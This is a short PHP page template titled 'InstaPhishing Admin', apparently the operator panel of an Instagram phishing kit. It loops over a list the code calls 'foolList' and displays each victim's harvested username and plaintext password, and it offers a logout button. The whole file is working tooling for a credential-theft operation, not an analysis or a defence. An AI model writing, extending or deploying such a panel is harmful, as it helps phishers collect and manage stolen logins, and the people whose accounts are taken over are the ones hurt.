
<?php
PROTON::TITLE("InstaPhishing Admin");
PROTON::CSSDEF("css/style.css");
PROTON::FAVDEF("favicon.ico");
PROTON::JSDEF("js/action.js");


?>

<div id="wrapper" style="height:70vh !important;">
  <div class="main-content" style="height:auto;width:270px">
      
    <h1><?php echo $language->admin_header;?></h1><br>


  <div class ="list">
          <?php 
            for($i = 0; $i<sizeof($controller->foolList);$i++)
            {
              echo '
                <div class="item">
                <input type="text" value="'.$controller->foolList[$i]['username'].'" class="input-1" />
                  <input  value="'.$controller->foolList[$i]['password'].'" class="input-2" />

                </div>
              
              ';
            }
          ?>
          
      </div>
 
  </div>
  
  <center>
    <input type="button" onclick="logout();" value="<?php echo $language->admin_button;?>" class="btn" style="width:250px;" />
  </center>
       

  


    <div id="result"> </div>

</div>



